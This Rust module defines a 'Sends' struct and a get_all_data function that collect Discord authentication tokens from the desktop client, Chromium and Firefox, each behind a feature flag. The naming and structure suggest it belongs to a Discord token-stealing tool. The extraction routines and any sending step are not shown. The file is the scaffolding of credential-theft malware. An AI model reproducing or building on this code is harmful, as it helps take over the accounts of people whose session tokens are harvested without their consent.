use serde_derive::{Deserialize, Serialize};

#[derive(Deserialize, Serialize)]
pub struct Sends {
    #[cfg(feature = "discord-client")]
    pub discord_client_token: Option<String>,
    #[cfg(feature = "discord-chromium")]
    pub discord_chromium_token: Option<String>,
    #[cfg(feature = "discord-firefox")]
    pub discord_firefox_token: Option<String>,
}

impl Sends {
    pub fn init() -> Sends {
        Sends {
            #[cfg(feature = "discord-client")]
            discord_client_token: None,
            #[cfg(feature = "discord-chromium")]
            discord_chromium_token: None,
            #[cfg(feature = "discord-firefox")]
            discord_firefox_token: None,
        }
    }
}

pub fn get_all_data() -> Sends {
    let mut sends = Sends::init();
    #[cfg(feature = "discord-client")]
    sends.discord_client();
    #[cfg(feature = "discord-chromium")]
    sends.discord_chromium();
    #[cfg(feature = "discord-firefox")]
    sends.discord_firefox();
    sends
}
